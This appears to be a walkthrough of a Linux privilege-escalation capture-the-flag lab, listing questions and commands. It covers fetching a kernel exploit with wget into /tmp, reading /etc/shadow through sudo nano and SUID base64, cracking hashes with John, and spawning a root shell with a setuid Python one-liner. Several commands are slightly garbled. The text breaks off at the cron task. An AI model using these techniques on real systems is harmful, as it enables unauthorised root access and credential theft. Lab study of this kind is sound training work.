Linux PrivEsc - Task 3 {Enumeration}

Question 1: What is the hostname of the target system?
{{Hint: hostname // using sudo -l also worked}}

Question 2: What is the Linux kernel version of the target system?
{{Hint: uname -a}}

Question 3: What Linux is this?
{{Hint: cat /etc/issue}}

Question 4: What version of Python is installed on the system?
{{Hint: python --version}}

Question 5: What vulnerability seems to affect the kernel of the target system? (Enter a CVE number)
{{Hint: Search on Exploit-DB, the one in question has something to do with overlayfs...}}



Task 5 {Privilege Escalation - Kernel Exploits}

Question 1: What is the content of the flag1.txt file?
{{First, enumerate which kernel version with uname -a and which linux using cat /etc/issue.
Search for an appropriate exploit (I used the same one in the last task), and download it.
Start an http server (python3 -m http.server [portnumber] will work)
On the victim machine, navigate to the /tmp/ folder
Use wget http://[Your Machine IP:port]/exploit.c
chmod +x exploit.c
Compile it using gcc exploit.c -o exploit.c
run ./exploit.c

If done correctly, you should now be root.
flag1.txt is located in /home/matt/


  
Task 6 {Privilege Escalation - Sudo}

Question 1:  How many programs can the user "karen" run on the target system with sudo rights?
{Hint: sudo -l}

Question 2: What is the content of the flag2.txt file?
{Hint: sudo nano}

Question 3: How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
{Hint: Search for nmap on https://gtfobins.github.io/}

Question 4: What is the hash of frank's password?
{Hint: sudo nano /etc/shadow}



Task 7 {Privilege Escalation - SUID}

Question 1: Which user shares the name of a great comic book writer?
{Hint: nano /etc/passwd}

Question 2: What is the password of user2?
{First, use "find / -type f -perm -04000 -ls 2>/dev/null" to find files that have SUID or SGID set.
Compare this list against gtfobins with the SUID filter set.
The only viable option appears to be base64. In order to get user2's password, we must abuse the binary to 
be able to read the /etc/shadow file.
LFILE=/etc/shadow
base64 "/etc/shadow" | base64 --decode 

Copy the output to a txt file, along with the contents of /etc/passwd in another. Next, we must unshadow it.
"unshadow [passwdfile.txt] [shadowfile.txt] > unshadowed.txt"
Now, run John against it
"john unshadowed.txt"

Question 3: What is the content of the flag3.txt file?
{LFILE=flag3.txt
base64 "flag3.txt" | base64 --decode}



Task 8 {Privilege Escalation: Capabilities}

Question 1: How many binaries have set capabilities?
{Hint: getcap -r / 2>/dev/null}

Question 2: What other binary can be used through its capabilities?
{Hint: Check gtfobins on which one can be abused}

Question 3: What is the content of the flag4.txt file?
{Hint: /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'}



Task 9 {Privilege Escalation: Cron Jobs}

Question 1: How many cron jobs can you see on the target system?
{{Hint: cat /etc/crontab}}

Question 2: What is the content of the flag5.txt file? 
{{
